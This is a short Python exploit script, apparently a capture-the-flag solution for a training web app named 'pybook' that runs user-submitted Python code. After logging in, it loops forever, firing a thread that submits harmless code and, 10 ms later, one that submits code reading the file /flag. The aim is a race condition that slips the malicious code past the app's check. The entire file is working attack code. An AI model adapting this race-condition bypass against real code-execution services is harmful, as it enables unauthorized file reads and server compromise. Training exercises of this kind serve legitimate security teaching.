import string
import requests
import random
import threading
import time

# Change this to the URL of the challenge
baseurl = "http://pybook.training.jinblack.it"

# Login to the application


def login(session, username, password):
    url = baseurl + "/login"
    data = {"username": username, "password": password}
    r = session.post(url, data=data)

# Register a new user


def registration(session, username, password):
    url = baseurl + "/register"
    data = {"username": username, "password": password}
    r = session.post(url, data=data)

# Run the code


def run(session, code):
    url = baseurl + "/run"
    data = code
    r = session.post(url, data=data)
    print(r.text)


# Create a new session
session = requests.Session()

# Generate a random username and password
username = "provaprova"
password = "provaprova"

# Do the login
login(session, username, password)

# Legit code that will print "Hello World"
legit_code = 'print("Hello World")'

# Malicious code that will open the flag file and read it
malicious_code = 'print(open("/flag","r").read())'

while True:
    # Create thread 1 that will run the legit code
    t1 = threading.Thread(target=run, args=(session, legit_code))

    # Create thread 2 that will run the malicious code
    t2 = threading.Thread(target=run, args=(session, malicious_code))

    t1.start()  # Start t1
    time.sleep(0.01)  # Sleep for 0.01 seconds
    t2.start()  # Start t2
    t1.join()  # Wait for t1 to finish
    t2.join()  # Wait for t2 to finish
